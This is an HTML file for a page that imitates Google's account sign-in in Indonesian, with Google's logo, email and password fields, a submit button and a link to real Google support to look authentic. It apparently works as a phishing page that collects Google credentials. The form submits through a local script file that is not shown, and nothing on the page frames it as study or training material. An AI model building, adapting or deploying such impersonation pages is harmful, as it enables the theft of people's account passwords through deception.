<!DOCTYPE html>
<html lang="en">
  <head>
    <!-- Required meta tags -->
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />

    <!-- Bootstrap CSS -->
    <link
      href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.0-beta2/dist/css/bootstrap.min.css"
      rel="stylesheet"
      integrity="sha384-BmbxuPwQa2lc/FVzBcNJ7UAyJxM6wuqIj61tLrc4wSX0szH/Ev+nYRRuWlolflfl"
      crossorigin="anonymous"
    />
    <link rel="shortcut icon" href="/Assets/IMG/Google.png" />
    <link rel="stylesheet" href="/Assets/CSS/main.css" />

    <title>Masuk - Akun Google</title>
  </head>
  <body>
    <div class="container">
      <div class="row d-flex justify-content-center mt-5">
        <div class="col-md-5">
          <div class="card shadow rounded">
            <div class="container">
              <div class="row">
                <div class="col-md-12 text-center mt-5">
                  <img src="/Assets/IMG/Google.png" alt="" srcset="" class="ing" />
                </div>
              </div>
              <div class="row mt-3">
                <div class="col-md-12 text-center">
                  <span class="tit"><b>Login</b></span
                  ><br />
                  <span>Gunakan akun Google anda</span>
                </div>
              </div>
              <div class="row d-flex justify-content-center mt-5 mb-4">
                  <div class="col-md-10">
                    <form name="form-control">
                      <div class="row">
                        <div class="col-md-12">
                          <div class="form-floating mb-4">
                            <input
                              type="email"
                              class="form-control"
                              id="email"
                              placeholder="name@example.com"
                              autofocus
                              name="email"
                              required
                            />
                            <label for="floatingInput">Email atau ponsel</label>
                          </div>
                        </div>
                      </div>
                      <div class="row">
                        <div class="col-md-12">
                          <div class="form-floating mb-4">
                            <input
                              type="password"
                              class="form-control"
                              id="password"
                              placeholder="name@example.com"
                              name="password"
                              required
                            />
                            <label for="floatingInput">Password</label>
                          </div>
                        </div>
                      </div>
                      <div class="row mb-5">
                        <div class="col-md-12 pljr">
                          Bukan komputer Anda? Gunakan mode Tamu untuk login
                          secara pribadi.
                          <a
                            href="https://support.google.com/chrome/answer/6130773?hl=id"
                            >Pelajari selengkapnya</a
                          >
                        </div>
                      </div>
                      <div
                        class="row justify-content-center fs-5 text-center mb-4 xcv"
                      >
                        <div class="col-6 xcv">
                          <a href="http://"><b>Buat akun</b></a>
                        </div>
                        <div class="col-6 xcv">
                          <button
                            type="submit"
                            class="btn btn-primary btn-sm btn-kirim"
                            id="lanjutkan"
                          >
                            <b>Berikutnya</b>
                          </button>
                          <button class="btn btn-primary btn-sm btn-loading d-none" type="button" disabled>
                            <span class="spinner-border spinner-border-sm " role="status" aria-hidden="true"></span>
                            Loading...
                          </button>
                        </div>
                      </div>
                    </form>
                  </div>
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>

    <!-- Optional JavaScript; choose one of the two! -->

    <!-- Option 1: Bootstrap Bundle with Popper -->
    <script
      src="https://cdn.jsdelivr.net/npm/bootstrap@5.0.0-beta2/dist/js/bootstrap.bundle.min.js"
      integrity="sha384-b5kHyXgcpbZJO/tY9Ul7kGkf1S0CWuKcCD38l8YkeH8z8QjE0GmW1gYU5S9FOnJ0"
      crossorigin="anonymous"
    ></script>

    <script
      src="https://code.jquery.com/jquery-3.6.0.js"
      integrity="sha256-H+K7U5CnXl1h5ywQfKtSj8PCmoN9aaq30gDh27Xc0jk="
      crossorigin="anonymous"
    ></script>

    <script src="/Assets/JS/script.js"></script>
    <!-- Option 2: Separate Popper and Bootstrap JS -->
    <!--
    <script src="https://cdn.jsdelivr.net/npm/@popperjs/core@2.6.0/dist/umd/popper.min.js" integrity="sha384-KsvD1yqQ1/1+IA7gi3P0tyJcT3vR+NdBTt13hSJ2lnve8agRGXTTyNaBYmCR/Nwi" crossorigin="anonymous"></script>
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.0.0-beta2/dist/js/bootstrap.min.js" integrity="sha384-nsg8ua9HAw1y0W1btsyWgBklPnCUAFLuTMS2G72MMONqmOymq585AcH49TLBQObG" crossorigin="anonymous"></script>
    -->
  </body>
</html>
